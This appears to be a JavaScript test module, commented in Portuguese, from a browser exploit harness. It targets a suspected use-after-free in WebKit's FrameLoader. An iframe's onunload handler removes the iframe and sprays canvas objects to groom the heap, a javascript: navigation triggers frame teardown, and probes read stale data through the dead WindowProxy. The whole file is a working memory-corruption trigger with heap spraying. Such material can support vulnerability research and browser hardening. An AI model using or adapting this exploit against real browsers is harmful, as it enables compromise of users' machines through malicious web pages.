import { Groomer } from '../mod_groomer.js';

export default {
    id:       'IFRAME_NAVIGATION_TEARDOWN_UAF',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'UAF no FrameLoader C++. Inicia uma navegação de iframe. O evento onunload do filho ' +
        'destrói o elemento <iframe> pai do DOM principal síncronamente. A transição de estado ' +
        'perde a referência do Document e liberta o DOMWindow, mas o JS retém a WindowProxy.',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.iframe = document.createElement('iframe');
        this.iframe.src = 'about:blank';
        this.sandbox.appendChild(this.iframe);
        
        // Guardamos as referências do mundo que vai ser destruído
        this.ghostWin = this.iframe.contentWindow;
        this.ghostDoc = this.ghostWin.document;
        
        const self = this;
        
        // A ARMADILHA: Quando o WebKit tentar navegar, nós destruímos a pista de aterragem
        this.ghostWin.onunload = function() {
            try {
                // Removemos o IFrame da Main Thread a partir do evento de Unload do filho
                self.iframe.remove();
                
                // Forçamos o WebCore a alocar lixo em cima do Frame antigo
                let trash = Groomer.sprayDOM('canvas', 100);
            } catch(e) {}
        };
    },

    trigger: function() {
        try {
            // O GATILHO: Dispara o processo brutal de Frame Teardown no C++
            this.iframe.src = 'javascript:"<html><body></body></html>"';
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O GhostDoc percebeu que foi desligado do mundo?
        s => {
            try {
                return s.ghostDoc.URL || 'Unreachable';
            } catch(e) { return 'Safe Exception'; }
        },
        
        // Probe 1: O WindowProxy ainda fala com o C++ morto? (Leak de Ponteiro)
        s => {
            try {
                // Tentamos aceder a um objeto C++ profundo através da janela morta
                let nav = s.ghostWin.navigator;
                let cores = nav.hardwareConcurrency;
                
                // Se devolver um número gigantesco em vez da quantidade de núcleos (ex: 8), temos UAF!
                if (typeof cores === 'number' && cores > 64) {
                    return cores; // Dispara STALE DATA
                }
                return 0; // Seguro (ou retornou undefined)
            } catch(e) {
                return 0; // Exceção de segurança gerada pelo WebKit (Cross-Origin ou Freed)
            }
        }
    ],

    cleanup: function() {
        try { this.iframe.remove(); } catch(e){}
        this.iframe = null;
        this.ghostWin = null;
        this.ghostDoc = null;
        this.results = {};
    }
};
